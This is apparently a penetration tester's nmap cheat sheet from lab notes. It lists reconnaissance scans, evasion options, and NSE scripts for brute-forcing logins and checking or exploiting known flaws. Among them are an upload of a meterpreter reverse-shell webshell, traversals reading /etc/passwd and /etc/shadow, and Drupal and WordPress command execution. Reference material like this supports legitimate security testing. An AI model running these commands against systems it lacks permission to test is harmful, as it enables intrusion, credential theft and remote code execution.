# Nmap

{% code-tabs %}
{% code-tabs-item title="Recon Scan" %}
```text
nmap -Pn -F -sSU -T5 -oX /root/10.11.1.1-254.xml 10.11.1.1-254 | grep -v 'filtered|closed' > /root/Documents/Scans/quick_recon.txt
```
{% endcode-tabs-item %}
{% endcode-tabs %}

> nmap -Pn -F -sSU -T5 -oX /root/10.11.1.1-254.xml 10.11.1.1-254 \| grep -v 'filtered\|closed' &gt; /root/Documents/Scans/quick\_recon.txt

{% hint style="info" %}
nmap -Pn -F -sSU -T5 -oX /root/10.11.1.1-254.xml 10.11.1.1-254 \| grep -v 'filtered\|closed' &gt; /root/Documents/Scans/quick\_recon.txt
{% endhint %}

{% tabs %}
{% tab title="Network Recon Scan" %}
nmap -Pn -F -sSU -T5 -oX /root/10.11.1.1-254.xml 10.11.1.1-254 \| grep -v 'filtered\|closed' &gt; /root/Documents/Scans/quick\_recon.txt
{% endtab %}

{% tab title="TCP/UDP All Ports" %}
nmap -Pn -sSU -T4 -p1-65535 -oX 192.168.37.67.xml 192.168.37.67 \| grep -v 'filtered\|closed'
{% endtab %}
{% endtabs %}

nmap scripts [https://nmap.org/nsedoc/](https://nmap.org/nsedoc/) [https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/) [https://highon.coffee/blog/nmap-cheat-sheet/](https://highon.coffee/blog/nmap-cheat-sheet/) [https://github.com/leonjza/awesome-nmap-grep](https://github.com/leonjza/awesome-nmap-grep)

Most used: HTTP Service Scan and Enumeration nmap -sSV -P0 -p"http\*" --script http-enum 192.168.37.53-oG /root/Documents/Scans/192.168.37.53-http-scan.txt

Generic Vuln Scan nmap -Pn --script vuln  nmap -sV --script vulners --script-args mincvss=5.0  nmap -p 139,445 --script= 10.11.1.5 nmap -p 0-65535 -A -v --script unusual-port nmap -p 80 10.11.1.229 -script http-put --script-args http-put.url=’file.asp’,http-put.file=’/root/Documents/Exploits/WebShells/windows-meterpreter-staged-reverse-tcp-443.asp’

## force-scan all ports UDP + TCP per host \(takes about 4 minutes per host on a LAN or roughly 17 hours for 254 hosts\):

• nmap -Pn -sSU -T4 -p1-65535 -oX 192.168.37.67.xml 192.168.37.67 \| grep -v 'filtered\|closed'

## intensive scan on the open ports per host, TCP and UDP separately to speed scan up:

tcp: • nmap -nvv -Pn -sSV -T1 -p$\(cat 10.11.1.110.xml \| grep portid \| grep protocol=\"tcp\" \| cut -d'"' -f4 \| paste -sd "," -\) --version-intensity 9 -oX /root/Documents/Scans/10.1.1.110-intense-tcp.xml 10.11.1.110 udp: • nmap -nvv -Pn -sUV -T1 -p$\(cat 10.1.1.110.xml \| grep portid \| grep protocol=\"udp\" \| cut -d'"' -f4 \| paste -sd "," -\) --version-intensity 9 -oX /root/Documents/Scans/10.11.1.110-intense-udp.xml 10.1.1.110

Scan a range of IPs nmap 192.168.1.1-20 Scan a subnet nmap 192.168.1.0/24 Discover hostnames nmap -sL 192.168.0.0/24 Scan targets from a text file nmap -iL list-of-ips.txt Scan a single Port nmap -p 22  Scan a range of ports nmap -p 1-100  Scan 100 most common ports \(Fast\) nmap -F  Scan all 65535 ports nmap -p-  Scan using TCP connect nmap -sT  Scan using TCP SYN scan \(default\) nmap -sS  Scan UDP ports nmap -sU -p 123,161,162  Scan selected ports - ignore discovery nmap -Pn -F  Detect OS and Services nmap -A  Scan for all HTTP servce types nmap -sTV -p"http_"  Standard service detection nmap -sV  Banner Grabbing nmap -sV --script=banner  More aggressive Service Detection nmap -sV --version-intensity 5  Lighter banner grabbing detection nmap -sV --version-intensity 0  Scan using default safe scripts nmap -sV -sC  Get help for a script nmap --script-help=ssl-heartbleed  Scan using a specific NSE script nmap -sV -p 443 –script=ssl-heartbleed.nse  Scan with a set of scripts nmap -sV --script=smb_  Discover hostnames nmap -sL 192.168.0.0/24 DNS Brute Force nmap -p 80 --script dns-brute.nse  DNS Broadcast Discovery nmap --script=broadcast-dns-service-discovery Find Virtual Hosts on IP nmap -p 80 --script hostmap-bfk.nse  Traceroute GeoLocation nmap --traceroute --script traceroute-geolocation.nse -p 80  VNC Auth Bypass nmap -sV --script=realvnc-auth-bypass  SSL ROCA Weak keys nmap -p 22,443 --script rsa-vuln-roca  IMAP Brute nmap -p 143,993 --script imap-brute  pop3 brute nmap -sV --script=pop3-brute  Unix rexec brute nmap -p 512 --script rexec-brute  Unix rlogin brute nmap -p 513 --script rlogin-brute  SIP Brute nmap -sU -p 5060 --script=sip-brute  SMTP Brute nmap -p 25 --script smtp-brute  SNMP Brute nmap -sU --script snmp-brute  \[--script-args snmp-brute.communitiesdb= \] SSH Brute nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst  --script-args ssh-brute.timeout=4s  Telnet Brute nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s 

Scan Types  
-sS/sT/sA/sW/sM: TCP SYN/Connect\(\)/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags : Customize TCP scan flags -sI : Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b : FTP bounce scan -sV: Probe open ports to determine service/version info --version-intensity : Set from 0 \(light\) to 9 \(try all probes\) --version-light: Limit to most likely probes \(intensity 2\) --version-all: Try every single probe \(intensity 9\) --version-trace: Show detailed version scan activity \(for debugging\) -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY\[portlist\]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO\[protocol list\]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve \[default: sometimes\] --dns-servers : Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host

OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take  are in seconds, or append 'ms' \(milliseconds\), 's' \(seconds\), 'm' \(minutes\), or 'h' \(hours\) to the value \(e.g. 30m\). -T: Set timing template \(higher is faster\) --min-hostgroup/max-hostgroup : Parallel host scan group sizes --min-parallelism/max-parallelism : Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies probe round trip time. --max-retries : Caps number of port scan probe retransmissions. --host-timeout : Give up on target after this long --scan-delay/--max-scan-delay : Adjust delay between probes --min-rate : Send packets no slower than  per second --max-rate : Send packets no faster than  per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu : fragment packets \(optionally w/given MTU\) -D : Cloak a scan with decoys -S : Spoof source address -e : Use specified interface -g/--source-port : Use given port number --proxies : Relay connections through HTTP/SOCKS4 proxies --data : Append a custom payload to sent packets --data-string : Append a custom ASCII string to sent packets --data-length : Append random data to sent packets --ip-options : Send packets with specified ip options --ttl : Set IP time-to-live field --spoof-mac : Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir : Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. File Outputs  
-oN \(normal\) -oX \(XML\) -oG \(Grepable\) -oA : Output in the three major formats at once -v: Increase verbosity level \(use -vv or more for greater effect\) -d: Increase debugging level \(use -dd or more for greater effect\) --reason: Display the reason a port is in a particular state --open: Only show open \(or possibly open\) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes \(for debugging\) --append-output: Append to rather than clobber specified output files --resume : Resume an aborted scan --stylesheet : XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output Input Format Types -iL : Input from list of hosts/networks -iR : Choose random targets --exclude : Exclude hosts/networks --excludefile : Exclude list from file

HTTP HTTP Recon \(Not as good as Nikto\) nmap --script http-enum  HTTP Title nmap --script http-title -sV -p http 192.168.1.0/24 SMB OS Discovery nmap -p 445 --script smb-os-discovery 192.168.1.0/24 SMB Brute Force nmap -sV -p 445 --script smb-brute  HTTP Site Map Generator nmap --script http-sitemap-generator -p 80  HTTP Methods nmap --script http-methods -p 80  Known Bad SSL Keys nmap --script ssl-known-key -p 443  HTTP Form Brute Auth nmap --script http-form-brute -p 80  HTTP Basic brute nmap --script http-brute -p 80  Proxy Server Broadcast Discovery nmap --script broadcast-wpad-discover HTTP Proxy Brute nmap --script http-proxy-brute -p 8080  Socks Brute nmap --script socks-brute -p 1080  Cold fusion Admin Cookie nmap -sV --script http-adobe-coldfusion-apsa1301  Cold fusion Admin Cookie exmaple directory nmap -p80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/  Cold Fusion Dir Traversal nmap --script http-vuln-cve2010-2861  ASP .NET Debug check nmap --script http-aspnet-debug --script-args http-aspnet-debug.path=/path  HTTP File Upload Check nmap -p80 --script http-fileupload-exploiter.nse  Heartbleed Testing  
nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24 Check for GIT Files nmap -sV -sC  IIS WEB DAV nmap --script http-iis-webdav-vuln -p80,8080  JSON Rest Endpoint Finder nmap -p 80 --script http-jsonp-detection  Directory Traversal nmap --script http-passwd --script-args http-passwd.root=/test/  PHPMyAdmin Dir Traversal nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'"  nmap -p80 --script http-phpmyadmin-dir-traversal  ShellShock Check nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls  Webmin Check nmap -sV --script http-vuln-cve2006-3392  nmap -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow  Apache Reverse Proxy Check nmap --script http-vuln-cve2011-3368  Apache Struts RCE nmap -p  --script http-vuln-cve2017-5638  Apache JServ brute nmap -p 8009 --script ajp-brute  PHP CGI Check nmap -sV --script http-vuln-cve2012-1823  nmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php  Drupal 'Drupageddon' &lt; 7.32 nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal"  nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false  Wordpress Download Manager nmap --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress"  nmap --script http-vuln-cve2014-8877  WordPress REST API 4.7.0 and 4.7.1 nmap --script http-vuln-cve2017-1001000 --script-args http-vuln-cve2017-1001000="uri"  nmap --script http-vuln-cve2017-1001000  Wordpress Usernames Enumeration nmap -p80 --script http-wordpress-users  nmap -sV --script http-wordpress-users --script-args limit=50  WordPress Brute nmap -sV --script http-wordpress-brute  nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true'  Intel Active Mangement nmap -p 16992 --script http-vuln-cve2017-5689  Joomla! 3.7.x SQLI nmap --script http-vuln-cve2017-8917 -p 80  nmap --script http-vuln-cve2017-8917 --script-args http-vuln-cve2017-8917.uri=joomla/ -p 80

SMB nmap --script smb-enum-services.nse -p445  nmap --script smb-enum-services.nse --script-args smbusername=,smbpass= -p445  Samba  Samba RCE 3.5.0 to 4.4.13  
nmap --script smb-vuln-cve-2017-7494 -p 445  MS RPC DNS ms07-029  
nmap --script smb-vuln-ms07-029.nse -p445  nmap -sU --script smb-vuln-ms07-029.nse -p U:137,T:139  MS RAS RPC nmap --script smb-vuln-ms06-025.nse -p445  nmap -sU --script smb-vuln-ms06-025.nse -p U:137,T:139  ms10-054 SMB nmap -p 445 --script=smb-vuln-ms10-054 --script-args unsafe  ms10-061 SMB nmap -p 445 --script=smb-vuln-ms10-061  Eternal Blue ms17-010 nmap -p445 --script smb-vuln-ms17-010  nmap -p445 --script vuln  SMB Brute nmap --script smb-brute.nse -p445  nmap -sU -sS --script smb-brute.nse -p U:137,T:139 

DATABASE Maria/MySQL Auth Bypass \(&lt;=5.1.61, 5.2.11, 5.3.5, 5.5.22\) nmap -p3306 --script mysql-vuln-cve2012-2122  nmap -sV --script mysql-vuln-cve2012-2122   
MondoDB Brute  
nmap -p 27017 --script mongodb-brute  Oracle brute  
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL  Postgresql brute  
nmap -p 5432 --script pgsql-brute  MYSQL Brute  
nmap --script=mysql-brute  MSSQL Discovery nmap --script broadcast-ms-sql-discover nmap --script broadcast-ms-sql-discover,ms-sql-info --script-args=newtargets

FTP FTP Password brute  
nmap --script ftp-brute -p 21  ProFTPD 1.3.3c Check nmap --script ftp-proftpd-backdoor -p 21  vsFTPd 2.3.4 nmap --script ftp-vsftpd-backdoor -p 21  ProFTPD 1.3.2rc3-1.3.3b nmap --script ftp-vuln-cve2010-4221 -p 21 

## !/bin/bash

targ=$1

## Translation of the above JF notes into usable nmap scans

## Single host TCP scan

nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p- $targ -oN nmap-tcp\_quick-$targ.txt

## Single host UDP scan

nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 $targ -oN nmap-udp\_quick-$targ.txt

## Single host FULL UDP scan

nmap -Pn -p- -sU --stats-every 3m --max-retries 1 -T3 $targ -oN nmap-udp\_full-$targ.txt

## Single host full TCP scan

nmap -n -v -Pn -sSV -T1 -p$open\_ports --version-all -A $targ -oN nmap-tcp\_full-$targ.txt exit 0

The option --script-help=$scriptname will display help for the individual scripts. To get an easy list of the installed scripts try locate nse \| grep script. You will notice I have used the -sV service detection parameter. Generally most NSE scripts will be more effective and you will get better coverage by including service detection.

